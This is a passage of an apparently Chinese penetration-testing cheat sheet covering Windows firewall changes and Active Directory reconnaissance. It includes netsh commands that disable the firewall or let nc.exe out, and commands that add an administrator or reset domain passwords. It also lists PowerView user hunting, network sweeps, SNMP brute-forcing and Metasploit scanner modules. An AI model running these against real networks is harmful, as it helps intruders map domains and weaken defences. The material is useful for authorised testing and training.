显示公用配置文件的属性</span></span><br><span class="line">netsh advfirewall show publicprofile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前交互式会话的策略存储</span></span><br><span class="line">netsh advfirewall show store</span><br></pre></td></tr></table></figure>

<p>查看防火墙状态</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofiles</span><br></pre></td></tr></table></figure>

<p>防火墙日志目录</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show logging</span><br></pre></td></tr></table></figure>

<p>自定义防火墙存储位置</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">&quot;c:\windows\temp\fw.log&quot;</span></span><br></pre></td></tr></table></figure>

<p>防火墙规则</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall show rule name=all</span><br><span class="line">netsh firewall show config</span><br><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure>

<p>出站入站</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 允许指定程序出站</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;test&quot;</span> <span class="built_in">dir</span>=out action=allow program=<span class="string">&quot;D:\nc.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许3389端口入站</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;3389&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许80-100端口出站</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;port&quot;</span> <span class="built_in">dir</span>=out action=allow protocol=TCP localport=<span class="number">80</span><span class="literal">-100</span></span><br></pre></td></tr></table></figure>

<p>关闭防火墙</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure>



<h3 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h3><p>查看/设置后缀关联</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assoc</span><br><span class="line">assoc .ext=example</span><br></pre></td></tr></table></figure>





<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><p>查看当前权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>

<p>获取域SID</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>



<h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过DNS后缀判断是否存在域</span></span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="comment"># 解析域名的IP，查看域名是否和DNS服务器是同一个IP</span></span><br><span class="line">nslookup xxx.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统配置信息里面会显示当前域的名称，如果是WORKGROUP则不存在域</span></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询工作站信息</span></span><br><span class="line">net config Workstation</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过与域同步时间来判断是否存在域</span></span><br><span class="line"><span class="comment"># 如果存在域且不是域用户，显示拒绝访问</span></span><br><span class="line"><span class="comment"># 如果不存在域，显示找不到域</span></span><br><span class="line">net time /domain</span><br></pre></td></tr></table></figure>

<h3 id="查询域内基础信息"><a href="#查询域内基础信息" class="headerlink" title="查询域内基础信息"></a>查询域内基础信息</h3><p>登录域</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>

<p>查看当前登录域和域用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config Workstation</span><br></pre></td></tr></table></figure>

<p>查看当前组的计算机名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>

<p>查询域内所有用户组列表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> /domain</span><br></pre></td></tr></table></figure>

<p>获取密码信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure>

<p>修改域用户的密码</p>
<p>需要域管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain xxx <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p>域信任信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure>







<h3 id="查询域用户信息"><a href="#查询域用户信息" class="headerlink" title="查询域用户信息"></a>查询域用户信息</h3><p>查看所在域的所有用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure>

<p>查看域用户的详细信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure>

<p>查看存在的用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure>

<p>其他常用dsquery命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer - 查找目录中的计算机</span><br><span class="line">dsquery contact - 查找目录中的联系人</span><br><span class="line">dsquery subnet - 查找目录中的子网</span><br><span class="line">dsquery <span class="built_in">group</span> - 查找目录中的组</span><br><span class="line">dsquery ou - 查找目录中的组织单位</span><br><span class="line">dsquery site - 查找目录中的站点</span><br><span class="line">dsquery server - 查找目录中的域控制器</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery quota - 查找目录中的配额</span><br><span class="line">dsquery partition - 查找目录中的分区</span><br><span class="line">dsquery * - 用通用的 LDAP 查询查找目录中的任何对象</span><br></pre></td></tr></table></figure>

<p>网络发现</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net view 					查看同一域内用户列表</span><br><span class="line">net view \\ip				查看某IP的共享</span><br><span class="line">net view \\USER				查看USER计算机的共享</span><br><span class="line">net view \\domain			查看存在多少域</span><br><span class="line">net view \\domain:USER		查看USER域的用户</span><br><span class="line">net view /all</span><br></pre></td></tr></table></figure>

<p>查看某个域用户的详细信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xxx /domain</span><br></pre></td></tr></table></figure>

<p>列出或断开网络上该计算机和其他计算机之间的会话</p>
<p>需要管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>



<h3 id="查询域组的信息"><a href="#查询域组的信息" class="headerlink" title="查询域组的信息"></a>查询域组的信息</h3><p>查询域工作组</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">net <span class="built_in">group</span> /domain</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;xxx&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查看域用户组信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Enterprise Admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查看域机器</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Computers&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查询某个域组的详细信息和包含成员</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br><span class="line">net localgroup users</span><br></pre></td></tr></table></figure>

<p>查询登录本机的域管理员</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators /domain</span><br></pre></td></tr></table></figure>

<p>域用户添加到本机</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators workgroup\user /add</span><br></pre></td></tr></table></figure>



<h3 id="查询域控制器"><a href="#查询域控制器" class="headerlink" title="查询域控制器"></a>查询域控制器</h3><p>定位域控</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>

<p>域控信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nltest /dclist:xx</span><br><span class="line"><span class="built_in">Get-NetDomain</span></span><br><span class="line"><span class="built_in">Get-NetDomainController</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查看域控制器主机名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup <span class="literal">-type</span>=SRV _ldap._tcp</span><br><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure>

<p>查看域控制器组</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查看域管理员</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>



<h3 id="查询域内管理员信息"><a href="#查询域内管理员信息" class="headerlink" title="查询域内管理员信息"></a>查询域内管理员信息</h3><p>查询本地管理员组用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>

<p>查询域管理员组</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Enterprise Admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查询域管理员用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>



<h3 id="域信息收集脚本"><a href="#域信息收集脚本" class="headerlink" title="域信息收集脚本"></a>域信息收集脚本</h3><h4 id="psloggedon-脚本"><a href="#psloggedon-脚本" class="headerlink" title="psloggedon 脚本"></a>psloggedon 脚本</h4><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
<p>在 Windows 上使用 <code>net session</code> 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsLoggedon.exe <span class="literal">-l</span> \\<span class="number">192.168</span>.<span class="number">1.1</span></span><br></pre></td></tr></table></figure>



<h4 id="PVEFindADUser-脚本"><a href="#PVEFindADUser-脚本" class="headerlink" title="PVEFindADUser 脚本"></a>PVEFindADUser 脚本</h4><p><a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
<p>PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe <span class="literal">-current</span></span><br></pre></td></tr></table></figure>



<h4 id="netview-脚本"><a href="#netview-脚本" class="headerlink" title="netview 脚本"></a>netview 脚本</h4><p><a target="_blank" rel="noopener" href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p>
<p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netview.exe <span class="literal">-d</span></span><br></pre></td></tr></table></figure>



<h4 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h4><p><a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p>
<p>常用的 NSE 脚本如下：</p>
<p><code>smb-enum-domains.nse</code>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p>
<p><code>smb-enum-users.nse</code>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p>
<p><code>smb-enum-shares.nse</code>:遍历远程主机的共享目录</p>
<p><code>smb-enum-processes.nse</code>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p>
<p><code>smb-enum-sessions.nse</code>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p>
<p><code>smb-os-discovery.nse</code>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -<span class="literal">-script</span>=smb<span class="literal">-os</span><span class="literal">-discovery</span>.nse <span class="literal">-p</span> <span class="number">445</span> <span class="number">192.168</span>.<span class="number">1.1</span></span><br></pre></td></tr></table></figure>



<h4 id="PowerView-脚本"><a href="#PowerView-脚本" class="headerlink" title="PowerView 脚本"></a>PowerView 脚本</h4><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p>
<p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code>$Env:PSModulePath</code>查看</p>
<p>接着在 powershell中输入<code>Import-Module PowerView</code>即可导入PowerView，使用<code>Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-StealthUserHunter</span>		获取域里面的所有用户</span><br><span class="line"><span class="built_in">Invoke-UserHunter</span>				找到域内特定的用户群，接受用户名、用户列表和域组查询</span><br><span class="line"><span class="built_in">Get-NetDomain</span>					获取当前用户所在域名称</span><br><span class="line"><span class="built_in">Get-NetUser</span>						获取所有用户的详细信息</span><br><span class="line"><span class="built_in">Get-NetDomainController</span>			获取所有域控制器的信息</span><br><span class="line"><span class="built_in">Get-NetComputer</span>					获取域内所有机器的详细信息</span><br><span class="line"><span class="built_in">Get-NetOU</span>						获取域中的OU信息</span><br><span class="line"><span class="built_in">Get-NetGroup</span>					获取所有域内组和组成员信息</span><br><span class="line"><span class="built_in">Get-NetFileServer</span>				根据SPN获取当前域使用的文件服务器信息</span><br><span class="line"><span class="built_in">Get-NetShare</span>					获取当前域内所有的网络共享信息</span><br><span class="line"><span class="built_in">Get-NetSession</span>					获取指定服务器的会话</span><br><span class="line"><span class="built_in">Get-NetRDPSession</span>				获取指定服务器的远程连接</span><br><span class="line"><span class="built_in">Get-NetProcess</span>					获取远程主机的进程</span><br><span class="line"><span class="built_in">Get-UserEvent</span>					获取指定用户的日志</span><br><span class="line"><span class="built_in">Get-ADObject</span>					获取活动目录的对象</span><br><span class="line"><span class="built_in">Get-NetGPO</span>						获取域内所有组的策略对象</span><br><span class="line"><span class="built_in">Get-DomainPolicy</span>				取域默认策略或域控制器策略</span><br><span class="line"><span class="built_in">Invoke-UserHunter</span>				获取域用户登陆的计算机信息及该用户是否有本地管理员权限</span><br><span class="line"><span class="built_in">Invoke-ProcessHunter</span>			通过查询域内所有的机器进程找到特定用户</span><br><span class="line"><span class="built_in">Invoke-UserEventHunter</span>			根据用户日志查询某域用户登陆过哪些域机器</span><br></pre></td></tr></table></figure>



<h3 id="域内存活主机探测"><a href="#域内存活主机探测" class="headerlink" title="域内存活主机探测"></a>域内存活主机探测</h3><h4 id="通过ICMP协议"><a href="#通过ICMP协议" class="headerlink" title="通过ICMP协议"></a>通过ICMP协议</h4><p><strong>CMD扫描</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows</span></span><br><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">Do</span> @ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">1</span>.%I | findstr <span class="string">&quot;TTL=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># linux</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="variable">$</span>( seq <span class="number">1</span> <span class="number">255</span>);<span class="keyword">do</span> ping <span class="literal">-c</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">1</span>.<span class="variable">$k</span>|grep <span class="string">&quot;ttl&quot;</span>|awk <span class="operator">-F</span> <span class="string">&quot;[ :]+&quot;</span> <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>; done </span><br></pre></td></tr></table></figure>

<p><strong>nmap扫描</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-sn</span> <span class="literal">-PE</span> <span class="literal">-T4</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line">nmap ‐<span class="built_in">sP</span> ‐PI ‐T4 <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><strong>powershell扫描</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sirrushoo/Powershell-Tools/blob/master/Invoke-TSPingSweep.ps1">https://github.com/sirrushoo/Powershell-Tools/blob/master/Invoke-TSPingSweep.ps1</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe ‐exec bypass ‐Command <span class="string">&quot;Import‐Module ./Invoke‐TSPingSweep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>cping扫描</strong></p>
<p><a target="_blank" rel="noopener" href="http://www.naughter.com/ping.html">http://www.naughter.com/ping.html</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cping.exe <span class="number">192.168</span>.<span class="number">1.1</span></span><br></pre></td></tr></table></figure>



<h4 id="通过ARP协议"><a href="#通过ARP协议" class="headerlink" title="通过ARP协议"></a>通过ARP协议</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp <span class="literal">-a</span></span><br></pre></td></tr></table></figure>

<p><strong>nmap扫描</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-sn</span> <span class="literal">-PR</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>



<p><strong>arp-scan</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arpscan">https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arpscan</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp<span class="literal">-scan</span>.exe <span class="literal">-t</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>



<p><strong>arp scannet</strong></p>
<p><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/arpscannet/files/latest/download">https://sourceforge.net/projects/arpscannet/files/latest/download</a></p>
<p><strong>arp-ping</strong></p>
<p><a target="_blank" rel="noopener" href="https://elifulkerson.com/projects/arp-ping.php">https://elifulkerson.com/projects/arp-ping.php</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp<span class="literal">-ping</span>.exe <span class="number">192.168</span>.<span class="number">1.100</span></span><br></pre></td></tr></table></figure>



<p><strong>powershell</strong></p>
<p>Nishang中的Invoke-ARPScan.ps1</p>
<p><a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1">https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\tmp&gt;powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">&quot;Import-Module .\arpscan.ps1;InvokeARPScan -CIDR 192.168.1.0/24&quot;</span></span><br></pre></td></tr></table></figure>



<p><strong>msf</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br></pre></td></tr></table></figure>



<h4 id="通过-Netbios-协议"><a href="#通过-Netbios-协议" class="headerlink" title="通过 Netbios 协议"></a>通过 Netbios 协议</h4><p><strong>nbtscan工具</strong></p>
<p><a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe <span class="literal">-m</span> <span class="number">192.168</span>.<span class="number">0.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>



<p><strong>nmap工具</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-sU</span> -<span class="literal">-script</span> nbstat.nse <span class="literal">-p</span> <span class="number">137</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span> <span class="literal">-T4</span></span><br></pre></td></tr></table></figure>



<p><strong>NetBScanner</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.nirsoft.net/utils/netbios_scanner.html">https://www.nirsoft.net/utils/netbios_scanner.html</a></p>
<p><strong>msf</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/netbios/nbname</span><br></pre></td></tr></table></figure>



<h4 id="通过-UDP-协议"><a href="#通过-UDP-协议" class="headerlink" title="通过 UDP 协议"></a>通过 UDP 协议</h4><p><strong>nmap</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-sU</span> <span class="literal">-T5</span> <span class="literal">-sV</span> -<span class="literal">-max</span><span class="literal">-retries</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">2.4</span> <span class="literal">-p</span> <span class="number">500</span></span><br></pre></td></tr></table></figure>



<p><strong>ScanLine</strong></p>
<p><a target="_blank" rel="noopener" href="http://www.ddooo.com/softdown/11258.htm">http://www.ddooo.com/softdown/11258.htm</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ScanLine.exe <span class="literal">-bht</span> <span class="number">1</span><span class="literal">-65535</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line">ScanLine.exe <span class="literal">-u</span> <span class="number">53</span> <span class="number">192.168</span>.<span class="number">1.0</span><span class="literal">-255</span></span><br></pre></td></tr></table></figure>



<p><strong>msf</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure>



<h4 id="通过-SNMP-协议"><a href="#通过-SNMP-协议" class="headerlink" title="通过 SNMP 协议"></a>通过 SNMP 协议</h4><p><strong>nmap</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:~<span class="comment"># nmap -sU --script snmp-brute 192.168.1.0/24 -T4</span></span><br></pre></td></tr></table></figure>



<h4 id="通过SMB协议"><a href="#通过SMB协议" class="headerlink" title="通过SMB协议"></a>通过SMB协议</h4><p><strong>nmap</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-sU</span> -<span class="literal">-script</span> snmp<span class="literal">-brute</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-T4</span></span><br><span class="line">nmap ‐sU ‐sS ‐‐script smb‐<span class="class"><span class="keyword">enum</span>‐<span class="title">shares</span>.<span class="title">nse</span> ‐<span class="title">p</span> 445 192.168.1.119</span></span><br></pre></td></tr></table></figure>



<p><strong>msf</strong></p>
